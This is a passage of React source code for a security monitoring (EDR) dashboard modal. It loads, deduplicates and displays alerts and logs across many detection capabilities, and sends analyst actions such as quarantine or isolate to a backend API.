      const from = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
      const base = { page: 1, limit: 200, from };
      const requests = [
        new URLSearchParams({ ...base, logType: 'auth' }),
        new URLSearchParams({ ...base, logType: 'system' }),
        new URLSearchParams({ ...base, logType: 'edr' }),
      ];
      return Promise.all(requests.map(rawQ => api.get(`/logs?${rawQ}`).catch(() => ({ data: { logs: [], total: 0 } }))))
        .then(results => {
          const seen = new Set();
          const rawLogs = results.flatMap(r => r.data?.logs || [])
            .filter(log => {
              const key = log._id || `${log.receivedAt || log.logTime}-${log.message}`;
              if (seen.has(key)) return false;
              seen.add(key);
              return dashboardIsAuthLog(log);
            })
            .sort((a, b) => new Date(b.receivedAt || b.logTime || 0) - new Date(a.receivedAt || a.logTime || 0))
            .slice(0, capabilityLimit);
          return rawLogs.map(dashboardAuthLogToAlert);
        });
    };
    const setAuthAlerts = (alertRows = [], rawRows = [], responseTotal = 0) => {
      const seen = new Set();
      const merged = [...alertRows, ...rawRows]
        .filter(row => {
          const key = row._id || `${row.createdAt || ''}-${row.ruleId || ''}-${row.description || ''}`;
          if (seen.has(key)) return false;
          seen.add(key);
          return true;
        })
        .sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
      setAlerts(merged);
      setTotal(Math.max(Number(responseTotal || 0), merged.length));
      setProcessStats24h({});
      setSelected(prev => {
        if (!prev) return prev;
        return merged.find(a => a._id === prev._id) || prev;
      });
    };
    const setFimAlerts = (rows = [], responseTotal = 0, stats = null) => {
      const live = [...rows]
        .filter(row => {
          const text = `${filePath(row)} ${fileName(row)} ${row.fileAction || ''} ${row.ruleId || ''} ${row.description || ''} ${JSON.stringify(row.rawEvent || {})}`.toLowerCase();
          return filePath(row)
            || fileName(row) !== '—'
            || row.fileAction
            || row.rawEvent?.file_path
            || row.rawEvent?.filePath
            || /\bfim\b|file|created|modified|deleted|renamed|hash|integrity|chmod|chown|permission|ownership|sensitive/.test(text);
        })
        .sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0))
        .slice(0, capabilityLimit);
      setAlerts(live);
      setTotal(Math.max(Number(responseTotal || 0), live.length));
      setFimStats(stats);
      setProcessStats24h({});
      setSelected(prev => {
        if (!prev) return prev;
        return live.find(a => a._id === prev._id) || prev;
      });
    };
    const loadFimRawLogs = (baseRows = [], baseTotal = 0, stats = null) => {
      const from = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
      return fetchAllFimRawLogs(from).then(rawRes => {
        const mapped = (rawRes.rows || []).map(dashboardFileLogToAlert);
        const seen = new Set();
        const merged = [...baseRows, ...mapped].filter(row => {
          const key = row._id
            || row.id
            || `${row.createdAt || row.receivedAt || ''}:${filePath(row)}:${row.description || row.message || ''}`;
          if (seen.has(key)) return false;
          seen.add(key);
          return true;
        });
        setFimAlerts(merged, Math.max(Number(baseTotal || 0), Number(rawRes.total || 0), merged.length), stats);
        return null;
      }).catch(() => {
        setFimAlerts(baseRows, baseTotal, stats);
        return null;
      });
    };
    const request = Number(queryBackendId) === 2 && category === 'file'
      ? fetchAllFimAlerts(q).then(fimRes => ({ data: { alerts: fimRes.rows, total: fimRes.total, fimStats: fimRes.fimStats } }))
      : Number(queryBackendId) === 6
        // The server uses the same endpoint telemetry scope as the capability-6
        // overview card, including every category and no result cap.
        ? api.get(`/dashboard/alerts/registry?${q}`)
        : api.get(`/dashboard/alerts/${Number(queryBackendId) === 10 ? 'usb' : category}?${q}`);
    return request
      .then(r => {
        const next = r.data.alerts || [];
        if (Number(queryBackendId) === 2 && category === 'file' && next.length === 0 && Number(r.data.total || 0) === 0) {
          const fallbackQ = new URLSearchParams(q);
          fallbackQ.delete('capabilityId');
          return fetchAllFimAlerts(fallbackQ).then(fallbackRes => {
            const fallbackAlerts = fallbackRes.rows || [];
            return loadFimRawLogs(
              fallbackAlerts,
              fallbackRes.total || fallbackAlerts.length,
              fallbackRes.fimStats || null
            );
          }).catch(() => loadFimRawLogs());
        }
        if (Number(queryBackendId) === 3 && category === 'network' && next.length === 0 && Number(r.data.total || 0) === 0) {
          const fallbackQ = new URLSearchParams(q);
          fallbackQ.delete('capabilityId');
          return api.get(`/dashboard/alerts/${category}?${fallbackQ}`).then(fallbackRes => {
            const fallbackAlerts = fallbackRes.data?.alerts || [];
            if (fallbackAlerts.length === 0 && Number(fallbackRes.data?.total || 0) === 0) return loadNetworkRawLogs();
            setAlerts(fallbackAlerts);
            setTotal(fallbackRes.data.total || fallbackAlerts.length);
            setProcessStats24h(fallbackRes.data.processStats24h || {});
            return null;
          });
        }
        if (Number(queryBackendId) === 4 && category === 'edr') {
          return loadAuthRawLogs().then(rawRows => setAuthAlerts(next, rawRows, r.data.total || next.length));
        }
        if (Number(queryBackendId) === 2 && category === 'file') {
          return loadFimRawLogs(next, r.data.total || next.length, r.data.fimStats || null);
        }
        setAlerts(next);
        setTotal(r.data.total || next.length);
        setProcessStats24h(r.data.processStats24h || {});
        setSelected(prev => {
          if (!prev) return prev;
          return next.find(a => a._id === prev._id) || prev;
        });
      })
      .catch(() => {
        if (Number(queryBackendId) === 2 && category === 'file') return loadFimRawLogs();
        if (Number(queryBackendId) === 3 && category === 'network') return loadNetworkRawLogs();
        if (Number(queryBackendId) === 4 && category === 'edr') {
          return loadAuthRawLogs().then(rawRows => setAuthAlerts([], rawRows, rawRows.length));
        }
        setAlerts([]);
        return null;
      })
      .finally(() => setLoading(false));
  }, [category, page, deptId, queryBackendId, capabilityLimit, isAdvancedCapability, isHashSignatureCapability, supportsUnifiedLiveAnalytics, windowEnd]);

  const loadSystems = useCallback(() => {
    if (![1, 2, 3, 4].includes(Number(queryBackendId))) return Promise.resolve();
    return api.get('/system')
      .then(r => {
        const list = r.data?.systems || r.data?.agents || r.data || [];
        setSystems(Array.isArray(list) ? list : []);
      })
      .catch(() => setSystems([]));
  }, [queryBackendId]);

  useEffect(() => {
    loadAlerts(false);
    loadSystems();
    const refreshMs = 30000;
    const t = setInterval(() => {
      loadAlerts(true);
      loadSystems();
    }, refreshMs);
    return () => clearInterval(t);
  }, [loadAlerts, loadSystems, queryBackendId]);

  useEffect(() => {
    // Registry refreshes through its 15-second API poll. Avoid a duplicate
    // Socket.IO transport here, which can leave stale polling sessions after
    // the backend restarts.
    if (!isHashSignatureCapability) return undefined;
    const socket = io(SOCKET_URL, { ...socketOptions, transports: ['polling', 'websocket'] });
    const joinCompany = () => {
      if (companyId) socket.emit('join:company', companyId);
    };

    const registryAlertBuffer = createEventBuffer(() => {
      loadAlerts(true);
    }, isAdvancedCapability ? 2000 : 1200);

    socket.on('connect', joinCompany);
    socket.on('alert:new', registryAlertBuffer.add);
    socket.on('hash:alert', registryAlertBuffer.add);
    socket.on('process:event', registryAlertBuffer.add);
    joinCompany();
    const disconnectSocket = connectSocket(socket);

    return () => {
      socket.off('connect', joinCompany);
      socket.off('alert:new', registryAlertBuffer.add);
      socket.off('hash:alert', registryAlertBuffer.add);
      socket.off('process:event', registryAlertBuffer.add);
      registryAlertBuffer.clear();
      disconnectSocket();
    };
  }, [queryBackendId, companyId, isAdvancedCapability, isHashSignatureCapability, loadAlerts]);

  useEffect(() => {
    setPage(1);
    setSelected(null);
    setProcessStats24h({});
    setFimStats(null);
    setAdvancedData(null);
  }, [category, deptId, cardId, queryBackendId]);

  useEffect(() => {
    if (cardId === 1 && (!selected || selected.ruleId === 'PROC_INVENTORY_SUMMARY')) {
      const firstProcess = summaryInventoryRows(alerts)[0] || alerts.find(a => a.ruleId !== 'PROC_INVENTORY_SUMMARY');
      if (firstProcess) setSelected(firstProcess);
    }
  }, [alerts, cardId, selected]);

  const doAction = async (alertId, action) => {
    try {
      await api.patch(`/dashboard/alerts/${alertId}/action`, { action });
      setAlerts(prev => prev.map(a => a._id !== alertId ? a : {
        ...a,
        status: action === 'ignore' ? 'false_positive' : 'investigating',
        quarantined: action === 'quarantine' ? true : a.quarantined,
        isolationStatus: action === 'isolate' ? 'isolated' : a.isolationStatus,
      }));
    } catch (err) { alert(err.response?.data?.message || 'Action failed'); }
  };

  return (
    <div
      style={{
        position: 'fixed', inset: 0, background: 'rgba(0,0,0,.75)',
        display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 1000
      }}
      onClick={e => { if (e.target === e.currentTarget) onClose(); }}
    >
      <div style={{
        background: '#0c1a2e', border: '1px solid #1e3a5f', borderRadius: 12,
        width: (fullPageCapability || category === 'file') ? 'calc(100vw - 8px)' : 'min(900px,95vw)',
        height: (fullPageCapability || category === 'file') ? 'calc(100vh - 8px)' : 'auto',
        maxHeight: (fullPageCapability || category === 'file') ? 'calc(100vh - 8px)' : '88vh',
        display: 'flex', flexDirection: 'column', overflow: 'hidden',
      }}>
        <div style={{
          display: 'flex', justifyContent: 'space-between', alignItems: 'center',
          padding: (fullPageCapability || category === 'file') ? '8px 22px' : '14px 18px', borderBottom: '1px solid #1e3a5f', flexShrink: 0
        }}>
          <h3 style={{ margin: 0, fontSize: 15, color: '#e0f2fe' }}>🛡️ {cardId}. {modalTitle}</h3>
          <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
            <span style={{
              fontSize: 11,
              color: '#60a5fa',
              background: '#1e3a5f44',
              border: '1px solid #1e3a5f',
              padding: '3px 8px',
              borderRadius: 6,
              display: 'flex',
              alignItems: 'center',
              gap: 6,
              fontWeight: 'bold'
            }}>
              {Number(queryBackendId) === 3
                ? `${Number(advancedData?.networkLogTotal ?? 0).toLocaleString('en-IN')} logs • LAST 24H`
                : `${Number(total || alerts.length || 0).toLocaleString('en-IN')} records`}
            </span>
            {cardId === 19 && (
              <>
                <style>{`
                  @keyframes bellRing {
                    0% { transform: rotate(0); }
                    15% { transform: rotate(15deg); }
                    30% { transform: rotate(-15deg); }
                    45% { transform: rotate(10deg); }
                    60% { transform: rotate(-10deg); }
                    75% { transform: rotate(4deg); }
                    85% { transform: rotate(-4deg); }
                    100% { transform: rotate(0); }
                  }
                  .bell-ring-animation {
                    animation: bellRing 2.5s infinite;
                    transform-origin: top center;
                  }
                `}</style>
                <div
                  onClick={() => {
                    window.dispatchEvent(new CustomEvent('switch-to-logs-tab'));
                    setBellUnreadCount(0);
                  }}
                  style={{
                    position: 'relative',
                    cursor: 'pointer',
                    fontSize: 16,
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    width: 26,
                    height: 26,
                    background: '#1e3a5f44',
                    border: '1px solid #1e3a5f',
                    borderRadius: '50%',
                    transition: 'all 0.2s'
                  }}
                  title="View Logs Tab"
                >
                  <span className="bell-ring-animation" style={{ display: 'inline-block' }}>🔔</span>
                  {bellUnreadCount > 0 && (
                    <span style={{
                      position: 'absolute',
                      top: -5,
                      right: -5,
                      background: '#ef4444',
                      color: '#fff',
                      fontSize: 8,
                      fontWeight: 'bold',
                      borderRadius: '50%',
                      padding: '2px 5px',
                      lineHeight: 1
                    }}>
                      {bellUnreadCount}
                    </span>
                  )}
                </div>
              </>
            )}
            <button onClick={onClose} style={{
              background: 'none', border: 'none',
              color: '#60a5fa', fontSize: 20, cursor: 'pointer', lineHeight: 1
            }}>✕</button>
          </div>
        </div>

        {cardId === 1 || Number(queryBackendId) === 1 ? (
          <ProcessActivityDashboard alerts={alerts} loading={loading} total={total} onAction={doAction} />
        ) : cardId === 2 || Number(queryBackendId) === 2 ? (
          <FileActivityDashboard alerts={alerts} loading={loading} total={total} recordsTotal={total} fimStats={fimStats} systems={systems} onAction={doAction} />
        ) : cardId === 3 || Number(queryBackendId) === 3 ? (
          <NetworkActivityDashboard alerts={alerts} loading={loading} total={total} networkLogTotal={advancedData?.networkLogTotal} systems={systems} onAction={doAction} />
        ) : cardId === 4 || Number(queryBackendId) === 4 ? (
          <UserAuthDashboard alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} />
        ) : cardId === 5 || Number(queryBackendId) === 5 ? (
          <MemoryActivityDashboard alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} />
        ) : cardId === 6 || Number(queryBackendId) === 6 ? (
          <RegistryActivityDashboard alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} />
        ) : cardId === 7 || Number(queryBackendId) === 7 ? (
          <SystemChangesDashboard alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} />
        ) : cardId === 8 || Number(queryBackendId) === 8 ? (
          <PersistenceMechanismDashboard alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} />
        ) : cardId === 9 ? (
          <WebDnsDashboardPanel alerts={alerts} loading={loading} total={total} />
        ) : cardId === 10 ? (
          <UsbDeviceControlDashboard alerts={alerts} loading={loading} total={total} />
        ) : cardId === 11 || Number(queryBackendId) === 11 ? (
          <UebaDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} />
        ) : cardId === 12 || Number(queryBackendId) === 12 ? (
          <DataSecurityDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} />
        ) : cardId === 13 || Number(queryBackendId) === 13 ? (
          <CredentialSecurityDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} />
        ) : cardId === 14 || Number(queryBackendId) === 14 ? (
          <LateralMovementDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} />
        ) : cardId === 15 || Number(queryBackendId) === 15 ? (
          <EmailThreatDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} />
        ) : cardId === 16 || Number(queryBackendId) === 16 ? (
          <InsiderThreatDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} />
        ) : cardId === 17 || Number(queryBackendId) === 17 ? (
          <PatchVulnerabilityDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} />
        ) : cardId === 18 || Number(queryBackendId) === 18 ? (
          <SandboxAnalysisDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} />
        ) : cardId === 19 || Number(queryBackendId) === 19 ? (
          <KernelLevelMonitoringDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} onRefresh={() => loadAlerts(false)} />
        ) : cardId === 20 || Number(queryBackendId) === 20 ? (
          <ApiCallMonitoringDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} onRefresh={() => loadAlerts(false)} />
        ) : cardId === 21 || Number(queryBackendId) === 21 ? (
          <ScriptExecutionDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} onRefresh={() => loadAlerts(false)} />
        ) : cardId === 22 || Number(queryBackendId) === 22 || String(modalTitle || '').toLowerCase().includes('time-based') || String(searchParams.get('capability') || '').includes('time-based') ? (
          <TimeBasedAnomalyDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} onRefresh={() => loadAlerts(false)} />
        ) : cardId === 23 || Number(queryBackendId) === 23 || String(modalTitle || '').toLowerCase().includes('geolocation') || String(searchParams.get('capability') || '').includes('geolocation') ? (
          <GeolocationAnomalyDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} onRefresh={() => loadAlerts(false)} />
        ) : cardId === 24 || Number(queryBackendId) === 24 || String(modalTitle || '').toLowerCase().includes('service') || String(searchParams.get('capability') || '').includes('service-monitoring') ? (
          <ServiceMonitoringDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} onAction={doAction} onRefresh={() => loadAlerts(false)} />
        ) : cardId === 25 || Number(queryBackendId) === 25 || String(modalTitle || '').toLowerCase().includes('hash') || String(searchParams.get('capability') || '').includes('hash-signature') ? (
          <HashSignatureDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} stats={advancedData} onAction={doAction} onRefresh={() => loadAlerts(false)} />
        ) : cardId === 28 || Number(queryBackendId) === 28 ? (
          <LolbinsDashboard alerts={alerts} loading={loading} total={total} />
        ) : cardId === 29 || Number(queryBackendId) === 29 ? (
          <MemoryOverflowDashboard alerts={alerts} loading={loading} total={total} />
        ) : cardId === 30 || Number(queryBackendId) === 30 ? (
          <DnsCachePoisoningDashboard alerts={alerts} loading={loading} total={total} />
        ) : cardId === 31 || Number(queryBackendId) === 31 ? (
          <DnsSinkholeMonitoringDashboard alerts={alerts} loading={loading} total={total} />
        ) : [5, 6, 7, 8, 26, 27].includes(Number(queryBackendId)) || cardId >= 22 ? (
          <CapabilityVisualDashboardPanel capabilityId={queryBackendId} alerts={alerts} loading={loading} total={total} advancedData={advancedData} onRefresh={() => loadAlerts(false)} />
        ) : category === 'file' ? (
          <FileActivityDashboard alerts={alerts} loading={loading} total={total} recordsTotal={total} fimStats={fimStats} systems={systems} onAction={doAction} />
        ) : (
          <div style={{ display: 'flex', flex: 1, overflow: 'hidden' }}>
            {/* List pane */}
            <div style={{ width: 340, borderRight: '1px solid #1e3a5f', overflowY: 'auto', flexShrink: 0 }}>
              {loading ? (
                <p style={{ color: '#1e40af', fontSize: 13, padding: 16 }}>Loading…</p>
              ) : alerts.length === 0 ? (
                <p style={{ color: '#1e3a5f', fontSize: 13, padding: 16 }}>No records found.</p>
              ) : alerts.map(a => (
                <div key={a._id} onClick={() => setSelected(a)} style={{
                  padding: '10px 14px', borderBottom: '1px solid #060e1a', cursor: 'pointer',
                  background: selected?._id === a._id ? '#1e3a5f' : 'transparent',
                }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', gap: 6, alignItems: 'flex-start' }}>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{
                        fontSize: 12, color: '#e2e8f0', overflow: 'hidden',
                        textOverflow: 'ellipsis', whiteSpace: 'nowrap'
                      }}>
                        {a.description || 'Security event'}
                      </div>
                      <div style={{ fontSize: 10, color: '#1e40af', marginTop: 2 }}>
                        {a.agentName || a.systemId?.name || '—'}
                        {a.departmentId?.name && ` · ${a.departmentId.name}`}
                        {' · '}{new Date(a.createdAt).toLocaleString()}
                      </div>
                      {/* VT badge in list — only show for actual threats */}
                      {vtIsThreaten(a.vtScore, a.vtVerdict) && (
                        <div style={{ marginTop: 3 }}>
                          <VtBadge score={a.vtScore} verdict={a.vtVerdict} />
                        </div>
                      )}
                    </div>
                    <span style={{
                      fontSize: 9, padding: '2px 6px', borderRadius: 4, flexShrink: 0,
                      background: SEVBG[a.severity] || '#1e3a5f', color: SEV[a.severity] || '#93c5fd',
                    }}>{a.severity}</span>
                  </div>
                </div>
              ))}
              {total > LIMIT && (
                <div style={{ display: 'flex', justifyContent: 'center', gap: 8, padding: 10 }}>
                  <button onClick={() => setPage(p => Math.max(1, p - 1))} disabled={page === 1}
                    style={{
                      fontSize: 11, padding: '3px 10px', borderRadius: 4, border: '1px solid #1e3a5f',
                      background: 'none', color: page === 1 ? '#1e3a5f' : '#60a5fa', cursor: page === 1 ? 'not-allowed' : 'pointer'
                    }}>←</button>
                  <span style={{ fontSize: 11, color: '#1e40af', lineHeight: '24px' }}>{page}/{Math.ceil(total / LIMIT)}</span>
                  <button onClick={() => setPage(p => p + 1)} disabled={page >= Math.ceil(total / LIMIT)}
                    style={{
                      fontSize: 11, padding: '3px 10px', borderRadius: 4, border: '1px solid #1e3a5f',
                      background: 'none', color: page >= Math.ceil(total / LIMIT) ? '#1e3a5f' : '#60a5fa',
                      cursor: page >= Math.ceil(total / LIMIT) ? 'not-allowed' : 'pointer'
                    }}>→</button>
                </div>
              )}
            </div>

            {/* Detail pane */}
            <div style={{ flex: 1, overflowY: 'auto', padding: 18 }}>
              <AlertDetail selected={selected} doAction={doAction} />
            </div>
          </div>
        )}
      </div>
    </div>
  );
}



export {
  CategoryModal as EDRCapabilityDashboardModal,
  NetworkActivityDashboardPanel,
  AuthenticationMonitoringDashboardPanel,
  CapabilityVisualDashboardPanel
};
